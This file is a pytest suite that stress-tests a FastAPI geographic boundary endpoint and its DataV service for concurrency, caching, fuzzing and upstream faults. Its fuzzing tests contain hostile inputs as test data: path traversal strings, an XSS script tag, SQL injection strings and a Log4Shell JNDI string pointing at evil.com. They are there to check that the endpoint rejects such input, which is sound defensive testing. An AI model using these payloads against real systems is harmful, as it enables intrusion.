# -*- coding: utf-8 -*-
"""
Empirical Adversarial Stress Harness for Milestone M2:
DataV Boundary & Async Offloading (/api/boundary and datav_service.py).

Targeted Failure Modes:
1. Event loop starvation: Concurrent slow boundary calls with artificial network delay;
   verifying /api/health responds in <50ms without being blocked.
2. 0 Chinese URLs: Exhaustive audit ensuring zero requests to Chinese or URL-encoded paths.
3. Concurrent cache write safety: High-concurrency race condition testing on disk & memory cache.
4. Extreme fuzzing & adversarial inputs: Whitespace, huge strings, emojis, control chars, null bytes, traversal.
5. Upstream fault injection: Timeouts, ConnectionErrors, malformed non-JSON responses.
6. Corrupted payloads: RFC 7946 null geometry, non-dict JSON lists, null coordinate elements.
"""
import asyncio
import concurrent.futures
import json
import os
import re
import threading
import time
import pytest
import requests
from httpx import AsyncClient, ASGITransport
from fastapi.testclient import TestClient

from backend.main import app
from backend.services import datav_service as datav


@pytest.fixture
def isolated_cache(tmp_path, monkeypatch):
    """Isolate cache directory to prevent interference with production cache."""
    cache_dir = tmp_path / "aoi_cache"
    cache_dir.mkdir(parents=True, exist_ok=True)
    # Write a baseline city mapping cache as exists in production
    with open(cache_dir / "_city_adcodes.json", "w", encoding="utf-8") as f:
        json.dump({"北京市": 110000, "长沙市": 430100, "朝阳区": 110105}, f)
    monkeypatch.setattr(datav, "_CACHE_DIR", str(cache_dir))
    monkeypatch.setattr(datav, "_CITY_ADCODES_MEM_CACHE", None)
    return cache_dir


# ==============================================================================
# PROBE 1: Event Loop Starvation Under Concurrent Slow Boundary Requests
# ==============================================================================

class TestEventLoopStarvationAdversarial:
    """
    Simulate 5 concurrent slow boundary calls (with artificial network latency)
    while continuously asserting /api/health responds in <50ms.
    """

    def test_concurrent_slow_boundary_does_not_starve_health(self, monkeypatch, isolated_cache):
        delay = 0.35  # 350ms artificial delay per boundary request

        mock_feature_collection = {
            "type": "FeatureCollection",
            "features": [
                {
                    "type": "Feature",
                    "properties": {"name": "北京市", "adcode": 110000},
                    "geometry": {
                        "type": "Polygon",
                        "coordinates": [[[116.4, 39.9], [116.5, 39.9], [116.5, 40.0], [116.4, 39.9]]]
                    }
                }
            ]
        }

        class MockSlowResponse:
            status_code = 200
            def json(self):
                return mock_feature_collection

        def slow_network_get(url, *args, **kwargs):
            time.sleep(delay)
            return MockSlowResponse()

        monkeypatch.setattr(datav.requests, "get", slow_network_get)

        async def run_probe():
            health_latencies = []
            stop_health_poller = False

            async def poll_health_repeatedly(client: AsyncClient):
                while not stop_health_poller:
                    t_start = time.perf_counter()
                    resp = await client.get("/api/health")
                    t_elapsed_ms = (time.perf_counter() - t_start) * 1000
                    health_latencies.append(t_elapsed_ms)
                    assert resp.status_code == 200, f"Health endpoint returned status {resp.status_code}"
                    await asyncio.sleep(0.02)  # poll every 20ms

            transport = ASGITransport(app=app)
            async with AsyncClient(transport=transport, base_url="http://testserver") as client:
                poller_task = asyncio.create_task(poll_health_repeatedly(client))

                # Launch 5 concurrent slow boundary requests across both place and adcode paths
                t0 = time.perf_counter()
                boundary_tasks = [
                    client.get("/api/boundary", params={"place": "北京市"}),
                    client.get("/api/boundary", params={"place": "长沙市"}),
                    client.get("/api/boundary", params={"place": "北京市朝阳区"}),
                    client.get("/api/boundary", params={"adcode": "110000"}),
                    client.get("/api/boundary", params={"adcode": "430000"}),
                ]
                responses = await asyncio.gather(*boundary_tasks)
                total_duration = time.perf_counter() - t0

                stop_health_poller = True
                await poller_task

            # Assert all boundary requests succeeded
            for r in responses:
                assert r.status_code == 200, f"Boundary request failed: {r.text}"
                assert "geojson" in r.json()

            # Assert health was polled multiple times during the in-flight slow requests
            assert len(health_latencies) >= 5, f"Health was only polled {len(health_latencies)} times"

            # Check maximum and average health latency: MUST be < 50ms
            max_health_latency = max(health_latencies)
            avg_health_latency = sum(health_latencies) / len(health_latencies)

            assert max_health_latency < 50.0, (
                f"Event loop starvation detected! Max /api/health latency was {max_health_latency:.2f}ms (threshold: 50ms)"
            )
            assert avg_health_latency < 25.0, (
                f"Event loop sluggishness! Average /api/health latency was {avg_health_latency:.2f}ms"
            )

            # Confirm parallel execution: 5 slow calls with 350ms delay should finish in ~350-700ms, NOT 5*350ms = 1750ms
            assert total_duration < (delay * 3.5), (
                f"Boundary calls appeared sequential instead of parallel thread execution: {total_duration:.2f}s"
            )

        asyncio.run(run_probe())


# ==============================================================================
# PROBE 2: Strict Audit - Zero Requests to Chinese or Non-numeric URLs
# ==============================================================================

class TestZeroChineseUrlsAdversarial:
    """
    Exhaustively probe all query formats (valid, ambiguous, invalid, malformed, crafted)
    and assert that exactly 0 network requests are ever made with Chinese or URL-encoded paths.
    """

    DATAV_URL_REGEX = re.compile(r"^https://geo\.datav\.aliyun\.com/areas_v3/bound/(\d{6})(_full)?\.json$")

    def test_strict_zero_chinese_url_audit(self, monkeypatch, isolated_cache):
        intercepted_urls = []

        dummy_fc = {
            "type": "FeatureCollection",
            "features": [
                {
                    "type": "Feature",
                    "properties": {"name": "测试", "adcode": 110000},
                    "geometry": {"type": "Polygon", "coordinates": [[[116.4, 39.9], [116.5, 39.9], [116.5, 40.0], [116.4, 39.9]]]}
                }
            ]
        }

        class InterceptResp:
            status_code = 200
            def json(self): return dummy_fc

        def spy_get(url, *args, **kwargs):
            intercepted_urls.append(url)
            return InterceptResp()

        monkeypatch.setattr(datav.requests, "get", spy_get)

        test_places = [
            # Standard provinces & cities
            "北京市", "湖南省", "广东省", "广州市", "深圳市", "上海市", "重庆市", "天津市",
            # Districts with parent context
            "北京市朝阳区", "江苏省南京市鼓楼区", "福建省福州市鼓楼区",
            # Bare ambiguous districts (must NOT trigger Chinese URL requests)
            "鼓楼区", "朝阳区", "西湖区", "白云区", "普陀区",
            # Non-existent & fantasy locations
            "艾泽拉斯大陆市", "虚构自治区", "NonExistentCity", "Neverland999",
            # Special crafted injection strings
            "北京_full.json", "%E5%8C%97%E4%BA%AC", "110000.json",
            "../110000", "<script>", "北京; DROP TABLE",
        ]

        for place in test_places:
            datav.fetch_boundary(place)

        # Audit every single outgoing request
        assert len(intercepted_urls) > 0, "No network requests were recorded during valid checks"

        chinese_char_pattern = re.compile(r"[\u4e00-\u9fff]")

        for url in intercepted_urls:
            # 1. No percent-encoding in the URL path (e.g. %E5%8C%97%E4%BA%AC)
            assert "%" not in url, f"Forbidden URL-encoded character found in URL: {url}"
            # 2. No Chinese characters in the URL
            assert not chinese_char_pattern.search(url), f"Forbidden Chinese character found in URL: {url}"
            # 3. Must strictly conform to 6-digit numeric pattern
            match = self.DATAV_URL_REGEX.match(url)
            assert match is not None, f"URL does not conform to strict numeric 6-digit contract: {url}"
            adcode_str = match.group(1)
            assert len(adcode_str) == 6 and adcode_str.isdigit()

    def test_nonexistent_places_issue_zero_network_requests(self, monkeypatch, isolated_cache):
        """When local mapping is loaded, unknown places must fail locally without hitting network at all."""
        intercepted = []
        monkeypatch.setattr(datav.requests, "get", lambda url, *a, **k: intercepted.append(url))

        for bogus in ["未知星系市", "不存在的县", "GothamCity", "Atlantis"]:
            res = datav.fetch_boundary(bogus)
            assert res is None

        assert len(intercepted) == 0, f"Network calls were made for unmapped places: {intercepted}"


# ==============================================================================
# PROBE 3: Concurrent Cache Write Safety (Disk & Memory Race Conditions)
# ==============================================================================

class TestConcurrentCacheSafetyAdversarial:
    """
    Stress-test high-concurrency read/write operations against the disk cache
    and in-memory city adcode mapping to detect file collisions, corrupted writes,
    or uncaught thread safety exceptions.
    """

    def test_concurrent_disk_cache_writes_no_corruption(self, isolated_cache, monkeypatch):
        """20 parallel threads querying the same uncached place simultaneously."""
        test_adcode = 430100
        mock_data = {
            "type": "FeatureCollection",
            "features": [
                {
                    "type": "Feature",
                    "properties": {"name": "长沙市", "adcode": test_adcode},
                    "geometry": {
                        "type": "Polygon",
                        "coordinates": [[[112.9, 28.1], [113.0, 28.1], [113.0, 28.2], [112.9, 28.1]]]
                    }
                }
            ]
        }

        class MockResp:
            status_code = 200
            def json(self): return mock_data

        monkeypatch.setattr(datav.requests, "get", lambda *a, **k: MockResp())
        monkeypatch.setattr(datav, "_load_city_adcodes", lambda: {"长沙市": test_adcode})

        errors = []
        results = []

        def worker_task(thread_id):
            try:
                res = datav.fetch_boundary("长沙市")
                results.append((thread_id, res is not None))
            except Exception as exc:
                errors.append((thread_id, exc))

        threads = [threading.Thread(target=worker_task, args=(i,)) for i in range(20)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert len(errors) == 0, f"Thread execution threw exceptions during concurrent cache write: {errors}"
        assert len(results) == 20
        assert all(success for _, success in results)

        # Inspect cache file on disk to guarantee it's not partially written or corrupted
        cache_files = list(isolated_cache.glob("datav_*.json"))
        assert len(cache_files) >= 1, "Expected cache file was not created"

        for c_file in cache_files:
            with open(c_file, "r", encoding="utf-8") as f:
                content = f.read()
                parsed = json.loads(content)  # Must be 100% valid JSON
                assert parsed.get("type") == "FeatureCollection"
                assert len(parsed.get("features", [])) > 0

    def test_concurrent_memory_cache_initialization(self, isolated_cache, monkeypatch):
        """Simultaneous concurrent calls to _load_city_adcodes when memory cache is cold."""
        cache_file = isolated_cache / "_city_adcodes.json"
        with open(cache_file, "w", encoding="utf-8") as f:
            json.dump({"高并发市": 880100, "测试区": 880101}, f)

        monkeypatch.setattr(datav, "_CITY_ADCODES_MEM_CACHE", None)

        results = []
        errors = []

        def worker():
            try:
                mapping = datav._load_city_adcodes()
                results.append(mapping.get("高并发市"))
            except Exception as e:
                errors.append(e)

        threads = [threading.Thread(target=worker) for _ in range(25)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert len(errors) == 0, f"Concurrent _load_city_adcodes threw errors: {errors}"
        assert len(results) == 25
        assert all(adcode == 880100 for adcode in results)


# ==============================================================================
# PROBE 4: Extreme Boundary Place Queries Fuzzing
# ==============================================================================

class TestExtremePlaceQueriesFuzzing:
    """
    Fuzz /api/boundary and datav_service with extreme inputs:
    - Whitespace variants (tabs, newlines, ideographic full-width, non-breaking, zero-width)
    - Huge payload strings (2,000 to 4,000 characters)
    - Unicode emojis & astral plane code points
    - Control characters & null bytes
    - Injection & path traversal attempts
    - Extreme adcodes

    Assert: NO payload causes unhandled 500 error or process freeze.
    """

    @pytest.fixture
    def client(self):
        return TestClient(app)

    @pytest.mark.parametrize("whitespace_val", [
        "",
        "   ",
        "\t\t\n\r",
        "\u3000\u3000",          # Full-width ideographic Chinese space
        "\u00a0\u00a0",          # Non-breaking space
        " \t \u3000 \r\n ",      # Mixed whitespace
    ])
    def test_whitespace_boundary_queries(self, client, whitespace_val):
        resp = client.get("/api/boundary", params={"place": whitespace_val})
        # Empty or whitespace-only place must be cleanly rejected with 400 Bad Request
        assert resp.status_code == 400, f"Expected 400 for '{whitespace_val}', got {resp.status_code}"
        assert "不能为空" in resp.json().get("detail", "")

    def test_zero_width_spaces_query(self, client):
        # Zero-width spaces are non-printing characters; should safely return 400 or 404, never 500
        resp = client.get("/api/boundary", params={"place": "\u200b\u200c\u200d"})
        assert resp.status_code in (400, 404)
        assert "detail" in resp.json()

    def test_huge_string_payload_place(self, client, monkeypatch, isolated_cache):
        """Large (4,000-character) place query must not cause ReDoS, crash, or 500."""
        huge_place = "北京市" * 1300 + "朝阳区"
        resp = client.get("/api/boundary", params={"place": huge_place})
        # Safely handled as not found (404) or rejected (400), NEVER unhandled 500
        assert resp.status_code in (200, 400, 404), f"Unexpected status {resp.status_code} for huge payload"

    @pytest.mark.parametrize("emoji_val", [
        "🏙️🌟🚀",
        "北京市🏢",
        "\U0001F600\U0001F601\U0001F602",
        "🇨🇳中国",
        "🗺️\u200d🗨️",
    ])
    def test_unicode_emojis_place(self, client, emoji_val):
        resp = client.get("/api/boundary", params={"place": emoji_val})
        assert resp.status_code in (200, 404), f"Emojis caused status {resp.status_code}: {resp.text}"

    @pytest.mark.parametrize("control_val", [
        "\x00",
        "北京\x00市",
        "".join(chr(i) for i in range(1, 32)),
        "\x1b[31mRedCity\x1b[0m",
        "foo\bbar\r\nbaz",
        "\u202e\u0041\u0042\u0043",  # RTL override
    ])
    def test_control_chars_and_null_bytes(self, client, control_val):
        resp = client.get("/api/boundary", params={"place": control_val})
        assert resp.status_code in (400, 404), (
            f"Control chars caused unexpected status {resp.status_code}: {resp.text}"
        )

    @pytest.mark.parametrize("injection_val", [
        "../../../../../../windows/system32",
        "..\\..\\..\\cache",
        "<script>alert('xss')</script>",
        "' OR '1'='1",
        "${jndi:ldap://evil.com/a}",
        "%00%2e%2e%2f",
        "110000.json",
        "430000_full.json",
    ])
    def test_injection_and_path_traversal(self, client, injection_val):
        resp = client.get("/api/boundary", params={"place": injection_val})
        assert resp.status_code in (400, 404), (
            f"Injection payload triggered unexpected status {resp.status_code}: {resp.text}"
        )

    @pytest.mark.parametrize("bad_adcode", [
        "0",
        "123",
        "12345",
        "1234567",
        "11000a",
        "abcdef",
        "-11000",
        " 11000",
        "11000 ",
        "../110",
        "110000; DROP TABLE",
        "None",
    ])
    def test_invalid_adcode_format_rejection(self, client, bad_adcode):
        resp = client.get("/api/boundary", params={"adcode": bad_adcode})
        assert resp.status_code == 400
        assert "6 位数字" in resp.json().get("detail", "")


# ==============================================================================
# PROBE 5: Fault Injection & Upstream Error Handling
# ==============================================================================

class TestFaultInjectionAdversarial:
    """Verify that network failures, timeouts, and upstream HTTP errors do not crash server."""

    @pytest.fixture
    def client(self):
        return TestClient(app)

    def test_upstream_timeout_handled_gracefully(self, client, monkeypatch, isolated_cache):
        def timeout_get(*args, **kwargs):
            raise requests.exceptions.Timeout("Connection timed out")

        monkeypatch.setattr(datav.requests, "get", timeout_get)
        resp = client.get("/api/boundary", params={"place": "北京市"})
        # When upstream times out, fetch_boundary catches exception and returns None -> 404
        assert resp.status_code == 404
        assert "未找到" in resp.json()["detail"]

    def test_upstream_connection_error_handled_gracefully(self, client, monkeypatch, isolated_cache):
        def conn_err_get(*args, **kwargs):
            raise requests.exceptions.ConnectionError("DNS resolution failed")

        monkeypatch.setattr(datav.requests, "get", conn_err_get)
        resp = client.get("/api/boundary", params={"adcode": "110000"})
        assert resp.status_code == 404
        assert "未找到" in resp.json()["detail"]

    def test_upstream_502_bad_gateway_handled_gracefully(self, client, monkeypatch, isolated_cache):
        class Mock502:
            status_code = 502
            def json(self): return {"error": "bad gateway"}

        monkeypatch.setattr(datav.requests, "get", lambda *a, **k: Mock502())
        resp = client.get("/api/boundary", params={"place": "北京市"})
        assert resp.status_code == 404

    def test_upstream_malformed_html_response_handled_gracefully(self, client, monkeypatch, isolated_cache):
        class MockHtmlResp:
            status_code = 200
            def json(self):
                raise json.JSONDecodeError("Expecting value", "<html>504 Gateway Timeout</html>", 0)

        monkeypatch.setattr(datav.requests, "get", lambda *a, **k: MockHtmlResp())
        resp = client.get("/api/boundary", params={"place": "北京市"})
        assert resp.status_code == 404

    def test_empty_features_in_geojson_returns_404(self, client, monkeypatch, isolated_cache):
        class MockEmptyFc:
            status_code = 200
            def json(self):
                return {"type": "FeatureCollection", "features": []}

        monkeypatch.setattr(datav.requests, "get", lambda *a, **k: MockEmptyFc())
        resp = client.get("/api/boundary", params={"place": "北京市"})
        assert resp.status_code == 404


# ==============================================================================
# PROBE 6: Corrupted Upstream GeoJSON & Network Payload Invariant Probes
# ==============================================================================

class TestCorruptedNetworkPayloadProbes:
    """
    Empirical fault tolerance probes for malformed/corrupted upstream GeoJSON payloads:
    1. Feature with null geometry ("geometry": null as valid in RFC 7946 §3.2)
    2. HTTP route boundary degradation when geometry is null (never return 500)
    3. Upstream network response is non-dict JSON (e.g. list [{"error": "..."}])
    4. Feature with null or malformed coordinate elements ([116.4, None])
    """

    @pytest.fixture
    def client(self):
        return TestClient(app)

    def test_null_geometry_in_features_returns_safe_or_none(self, monkeypatch, isolated_cache):
        """
        RFC 7946 §3.2 explicitly allows "geometry": null for unlocated features.
        fetch_boundary must not crash with AttributeError: 'NoneType' object has no attribute 'get'.
        """
        mock_payload = {
            "type": "FeatureCollection",
            "features": [
                {
                    "type": "Feature",
                    "properties": {"name": "北京市", "adcode": 110000},
                    "geometry": None,
                }
            ]
        }
        class MockResp:
            status_code = 200
            def json(self): return mock_payload

        monkeypatch.setattr(datav.requests, "get", lambda *a, **k: MockResp())
        try:
            result = datav.fetch_boundary("北京市")
        except AttributeError as e:
            pytest.fail(f"fetch_boundary crashed with AttributeError on null geometry: {e}")
        assert result is None or isinstance(result, dict)

    def test_route_boundary_with_null_geometry_does_not_return_500(self, client, monkeypatch, isolated_cache):
        """
        Upstream GeoJSON with null geometry must degrade cleanly to 200 or 404, never HTTP 500.
        """
        mock_payload = {
            "type": "FeatureCollection",
            "features": [
                {
                    "type": "Feature",
                    "properties": {"name": "北京市", "adcode": 110000},
                    "geometry": None,
                }
            ]
        }
        class MockResp:
            status_code = 200
            def json(self): return mock_payload

        monkeypatch.setattr(datav.requests, "get", lambda *a, **k: MockResp())
        resp = client.get("/api/boundary", params={"place": "北京市"})
        assert resp.status_code != 500, f"Server returned 500 Internal Error: {resp.text}"
        assert resp.status_code in (200, 404)

    def test_non_dict_network_json_returns_none(self, client, monkeypatch, isolated_cache):
        """
        Upstream proxy/CDN returns non-dict JSON (e.g. list [{'error': 'rate limit'}]).
        fetch_boundary must return None without raising AttributeError: 'list' object has no attribute 'get'.
        Route must cleanly return 404, not 500.
        """
        class MockListResp:
            status_code = 200
            def json(self): return [{"error": "rate limit exceeded"}]

        monkeypatch.setattr(datav.requests, "get", lambda *a, **k: MockListResp())
        try:
            result = datav.fetch_boundary("北京市")
        except AttributeError as e:
            pytest.fail(f"fetch_boundary crashed on non-dict JSON response: {e}")
        assert result is None

        resp = client.get("/api/boundary", params={"place": "北京市"})
        assert resp.status_code == 404, f"Expected 404 for non-dict response, got {resp.status_code}: {resp.text}"

    def test_null_coordinates_in_feature_does_not_crash(self, client, monkeypatch, isolated_cache):
        """
        Feature contains corrupt coordinate tuples (e.g. [116.4, None]).
        Coordinate conversion must not crash with unhandled TypeError.
        Route must degrade safely without returning 500.
        """
        mock_payload = {
            "type": "FeatureCollection",
            "features": [
                {
                    "type": "Feature",
                    "properties": {"name": "北京市", "adcode": 110000},
                    "geometry": {
                        "type": "Polygon",
                        "coordinates": [[[116.4, None], [116.5, 39.9], [116.5, 40.0], [116.4, None]]]
                    }
                }
            ]
        }
        class MockResp:
            status_code = 200
            def json(self): return mock_payload

        monkeypatch.setattr(datav.requests, "get", lambda *a, **k: MockResp())
        try:
            result = datav.fetch_boundary("北京市")
        except TypeError as e:
            pytest.fail(f"fetch_boundary crashed with TypeError on null coordinates: {e}")
        assert result is None or isinstance(result, dict)

        resp = client.get("/api/boundary", params={"place": "北京市"})
        assert resp.status_code != 500, f"Server returned 500 on null coordinates: {resp.text}"
        assert resp.status_code in (200, 404)

